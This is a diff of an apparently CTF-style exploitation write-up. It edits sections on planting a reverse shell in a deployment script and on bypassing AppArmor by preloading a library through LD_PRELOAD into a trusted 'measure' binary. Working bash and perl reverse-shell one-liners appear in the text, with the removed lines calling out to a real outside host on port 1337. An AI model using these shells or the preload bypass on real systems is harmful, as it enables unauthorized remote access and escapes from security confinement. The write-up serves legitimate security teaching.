@@ -41,18 +41,18 @@ This is not strictly necessary (and not exactly difficult since we control the G
 A quick reverse shell should be in the repertoire of every hacker.
 My personal favorite being a simple:
 ```bash
-sh -i >& /dev/tcp/feuermagier.com/1337 0>&1
+sh -i >& /dev/tcp/target_address/target_port 0>&1
 ```
 or alternatively with perl:
 ```perl
-perl -e 'use Socket;$i="feuermagier.com";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+perl -e 'use Socket;$i="target_address";$p=target_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 in case the first one is making problems.
 You'll be surprised by how many systems and even minimalist dev-containers ship with perl installed.
 
 In any case, inserting this into the deployment script leaves us with a simple, but functional reverse shell.
 
-### 2. Bypassing AppArmor protection
+### 2. Inspecting the target program
 Let us take a quick look at the Ghidra disassembler output of relevant section of the `measure` program:
 ![measure](img/measure.png)
 Line `92` swaps into the privileged profile. Line `129` swaps out of it.\
@@ -62,8 +62,13 @@ The problem is that we can not simply call [`aa_change_hat()`](https://man.archl
 The [AppArmor](https://www.apparmor.net/) kernel security module checks the binary origin path of the process executing the respective syscall.
 If we were to call this function in our untrusted program (or any other program placed on the target machine), the security profile change would be *denied*. Only a process with the origin binary `/data/delivery/measure` (the path of the trusted measure program) may perform the hat change.
 
-### 3. DLL injection
+### 3. Bypassing AppArmor protection
 
-How can we *become* the measure program?\
-We can not write or modify it, but there is one thing we control:\
-The **environment**, or more specifically, the **environmental variables**.
+How can we *become* the `measure` program?\
+We can not overwrite or modify its binary and we can not access its memory at runtime.
+
+We *do* control the *context* in which it is launched though.
+Specifically, the **environmental variables** present at its launch.
+
+An environmental variable with useful effects for our cause is the `LD_PRELOAD` variable.
+It instructs the [dynamic linker](https://linux.die.net/man/8/ld-linux) to link a dynamic library from a specified path into any program that is launched while `LD_PRELOAD` is in context.
